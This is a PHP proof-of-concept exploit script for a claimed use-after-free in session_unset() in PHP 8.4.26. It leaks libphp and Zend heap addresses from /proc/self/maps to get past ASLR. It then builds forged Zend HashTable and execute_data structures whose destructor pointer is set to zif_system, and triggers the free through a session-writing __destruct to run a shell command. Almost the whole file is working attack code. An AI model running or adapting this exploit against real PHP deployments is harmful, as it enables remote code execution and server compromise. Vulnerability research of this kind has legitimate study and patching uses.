<?php
/*
 * PHP 8.4.26 session_unset() UAF -> RCE with ASLR enabled.
 *
 * Chain uses only Zend/libphp addresses:
 *   - libphp.so base from /proc/self/maps
 *   - Zend MM 2MB chunk base from /proc/self/maps
 *   - pDestructor = zif_system (libphp internal function handler)
 * No libc address is used.
 *
 * The freed old arData chunk is at chunk_base + S_OFF (measured for this
 * build/request shape; see NOTES).
 */
error_reporting(0);

$S_OFF = 0x4640;          // offset of freed arData allocation inside the 2MB chunk
$ZIF_SYSTEM_OFF = 0x43a870; // libphp.so: zif_system

session_start();

// ---- leak bases (Zend-internal addresses only) ----
$maps = @file_get_contents('/proc/self/maps');
$libbase = 0;
$chunkbase = 0;
if ($maps !== false) {
    foreach (explode("\n", $maps) as $line) {
        if (!$libbase &&
            preg_match('#^([0-9a-f]+)-[0-9a-f]+ r--p 00000000 .*?/libphp\.so$#', $line, $m)) {
            $libbase = (int)hexdec($m[1]);
        }
        if (!$chunkbase &&
            preg_match('#^([0-9a-f]+)-([0-9a-f]+) rw-p 00000000 00:00 0\s*$#', $line, $m)) {
            $start = (int)hexdec($m[1]);
            $end = (int)hexdec($m[2]);
            if ($end - $start === 0x200000 && ($start & 0x1FFFFF) === 0) {
                $chunkbase = $start;
            }
        }
    }
}
if (!$libbase || !$chunkbase) {
    echo "LEAKFAIL\n";
    exit;
}

$S = $chunkbase + $S_OFF;
$zif_system = $libbase + $ZIF_SYSTEM_OFF;

// ---- build 320-byte fake arData payload ----
$p = str_repeat("\0", 320);
function put64(&$s, $off, $v) { $s = substr_replace($s, pack('P', $v), $off, 8); }
function put32(&$s, $off, $v) { $s = substr_replace($s, pack('V', $v), $off, 4); }

put64($p, 0x60, $S + 0x80);        // fake zval.value -> fake HashTable
put32($p, 0x68, 0x307);            // IS_ARRAY_EX
put32($p, 0x80, 1);                // gc.refcount
put32($p, 0x84, 7);                // gc.type_info = IS_ARRAY
put32($p, 0x88, 0x10);             // HASH_FLAG_STATIC_KEYS
put32($p, 0x8C, 0xFFFFFFF8);       // nTableMask
put64($p, 0x90, $S + 0xA0);        // fake arData
put32($p, 0x98, 1);                // nNumUsed
put32($p, 0x9C, 1);                // nNumOfElements
put64($p, 0xB0, $zif_system);      // pDestructor
// fake zend_function at S+0x40
put32($p, 0x40, 1);                // type = ZEND_INTERNAL_FUNCTION
put32($p, 0x44, 0);                // fn_flags
// fake execute_data at S+0xA0 (also the fake HashTable's arData bucket)
put64($p, 0xB8, $S + 0x40);        // execute_data->func
put32($p, 0xC8, 0);                // call_info
put32($p, 0xCC, 1);                // num_args = 1
// arg 1 at execute_data + 5*16 = S+0xF0
put64($p, 0xF0, $S + 0x100);       // zval.value -> fake zend_string
put32($p, 0xF8, 6);                // IS_STRING
// fake zend_string "id>/tmp/x" at S+0x100 (chars at S+0x118)
put32($p, 0x100, 1);               // refcount
put32($p, 0x104, 0x106);           // IS_STRING_EX
put64($p, 0x110, 9);               // len
$cmd = "id>/tmp/x";
for ($i = 0; $i < strlen($cmd); $i++) {
    $p[0x118 + $i] = $cmd[$i];
}
$p[0x118 + strlen($cmd)] = "\0";

// ---- trigger defect D ----
$fp = fopen("php://memory", "w");
class X {
    public $fp, $payload, $keep = [];
    function __construct($fp, $payload) { $this->fp = $fp; $this->payload = $payload; }
    function __destruct() {
        $_SESSION["pwn"] = "x";
        $this->keep[] = stream_bucket_new($this->fp, $this->payload);
    }
}
$_SESSION["x"] = new X($fp, $p);
for ($i = 0; $i < 7; $i++) { $_SESSION["k".$i] = "v"; }
session_unset();
echo "AFTER\n";
